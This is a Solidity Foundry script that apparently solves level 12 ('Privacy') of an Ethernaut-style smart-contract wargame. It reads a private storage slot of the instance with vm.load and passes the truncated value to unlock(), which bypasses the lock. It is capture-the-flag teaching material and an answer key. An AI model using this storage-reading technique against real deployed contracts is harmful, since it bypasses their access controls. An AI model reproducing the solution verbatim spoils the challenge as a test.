// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "./SolveLevelBase.sol";
import "../src/interfaces/IPrivacy.sol";

contract SolveLevel12 is SolveLevelBase {
    function getInstanceCreationData()
        internal
        pure
        override
        returns (address levelAddress, uint256 value)
    {
        levelAddress = 0x1ca9f1c518ec5681C2B7F97c7385C0164c3A22Fe;
        value = 0;
    }

    function solveLevel(address instanceAddress, address player)
        internal
        override
    {
        IPrivacy instance = IPrivacy(instanceAddress);

        bytes32 data2 = vm.load(instanceAddress, bytes32(uint256(5)));
        instance.unlock(bytes16(data2));
    }
}
